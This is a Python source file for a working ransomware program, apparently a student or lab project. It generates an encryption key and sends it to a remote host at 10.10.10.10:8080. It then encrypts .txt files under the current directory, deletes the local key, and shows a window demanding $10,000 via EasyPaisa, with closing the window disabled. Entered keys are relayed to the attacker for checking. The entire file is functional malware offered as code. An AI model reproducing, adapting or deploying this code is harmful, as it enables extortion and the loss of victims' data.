import os
from os.path import expanduser
from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.10.10',8080))

class Ransomware:

    def __init__(self, key=None):
        """
        Initializes an instance of the Ransomware class.

        Args:
            key: 128-bit AES key used to encrypt or decrypt files

        Attributes:
            cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed
            file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
        """

        self.key = key
        self.cryptor = None
        self.file_ext_targets = ['txt']

    def generate_key(self):
        """
        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
        """

        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, keyfile_name):
        """
        Reads in a key from a file.
        Args:
            keyfile_name:str: Path to the file containing the key
        """

        with open(keyfile_name, 'rb') as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)

    def write_key(self, keyfile_name):
        """
        Writes the key to a keyfile
        """

        print(self.key)
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)

    def post_key(self):
        """
        Posts the key to the attacker
        """
        # print(self.key)
        #Sending the key to the attacker.
        s.send(bytes("K\n{}".format(str(self.key,'utf-8')),'utf-8'))

    def get_key(self, key_value):
        """
        This function updates the value of self.key with the key value passed i.e. key_value. Also it updates the value of the cryptor.
        """
        # Storing the correct key value back to the self.key attributes.
        self.key=key_value
        self.cryptor=Fernet(self.key)

    def del_key(self):
        """
        This function flushes the REAL key value and the cryptor generated in this system so that the victim cannot access it directly.
        """
        # Deleting the values from the self.key and self.cryptor attributes.
        self.key=None
        self.cryptor=None
        

    def crypt_root(self, root_dir, encrypted=False):
        """
        Recursively encrypts or decrypts files from root directory with allowed file extensions
        Args:
            root_dir:str: Absolute path of top level directory
            encrypt:bool: Specify whether to encrypt or decrypt encountered files
        """

        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)

                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue

                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        """
        Encrypts or decrypts a file
        Args:
            file_path:str: Absolute path to a file
        """

        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
##                print(f'File contents pre encryption: {_data}')
                data = self.cryptor.encrypt(_data)
##                print(f'File contents post encryption: {data}')
            else:
                data = self.cryptor.decrypt(_data)
##                print(f'File content post decryption: {data}')

            file=open(file_path,'wb')
            file.write(data)

# This event will execute when the key shall be entered.
def checkKey(event):
    # Reading the text box
    a = text.get()
    # Converting the text input to bytes.
    a=bytes(a,'utf-8')
    #Sending the text to the attacker.
    s.send(a)
    # Receiving a msg from the attacker about whether the key entered is correct or wrong.
    msg=str(s.recv(1024),'utf-8')
    #If the key entered in correct then the attacker will send a right msg.    
    if msg=='right':
        labelText.set("Key Value is Correct. Your Files are being Decrypted.")
        #Decrypting the data.
        rware.get_key(a)
        rware.crypt_root(local_root,encrypted=True)
        # closing the socket.
        s.close()
        # destroying the window gui.
        root.destroy()
    else:
        labelText.set("Wrong Key!")
        
    
##    s.close()
    

def on_closing():
    pass

if __name__ == '__main__':
    # sys_root = expanduser('~')
    local_root = '.'
    rware=Ransomware()

    # Generating the main key.
    rware.generate_key()
    # Posting the key..
    rware.post_key()
    # Encrypting the files.
    rware.crypt_root(local_root)
    # Deleting the key and the cryptor value from the victim machine.
    rware.del_key()

    
    # Making a gui.
    root = Tk()
    root.title("NED RANSOMWARE")
    frame = Frame(root)
    label1 = Label(frame, text="YOU HAVE BEEN HACKED", font=("Aerial", 20))
    label2 = Label(frame, text="Please follow our instructions to recover your files.\n"
                               "Send us an amount of $10000 via EasyPaisa in return for which\n"
                                   "you will receive a key. You will then enter that key below to\n"
                               "recover your files. If you do not coorperate, your files will be\n"
                               "lost forever. Also do not terminate this windows or else you won't be \n"
                               "able to recover your data. It's your choice....", font=("Aerial", 15))
    labelText = StringVar()
    label3 = Label(frame, textvariable=labelText, font=("Aerial", 12))
    labelText.set("Enter your key")
    text = Entry(frame, width=80)
    button = Button(frame, text="Save My Files!")
    ##  Binding the text box and the button to a common event handler. i.e. checkKey().
    button.bind("<Button-1>", checkKey)
    text.bind("<Return>", checkKey)
    label1.pack(padx=5, pady=5)
    label2.pack(padx=5, pady=5)
    label3.pack(padx=5, pady=1)
    text.pack(padx=10, pady=5)
    button.pack(padx=5, pady=5)
    frame.pack()
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()



    #
    # # rware.generate_key()
    # # rware.write_key()
    #
    # import argparse
    #
    # parser = argparse.ArgumentParser()
    # parser.add_argument('--action', required=True)
    # parser.add_argument('--keyfile')
    #
    # args = parser.parse_args()
    # action = args.action.lower()
    # keyfile = args.keyfile
    #
    # rware = Ransomware()
    #
    # if action == 'decrypt':
    #     if keyfile is None:
    #         print('Path to keyfile must be specified after --keyfile to perform decryption.')
    #     else:
    #         rware.read_key(keyfile)
    #         rware.crypt_root(local_root, encrypted=True)
    # elif action == 'encrypt':
    #     rware.generate_key()
    #     rware.write_key('keyfile')
    #     rware.crypt_root(local_root)
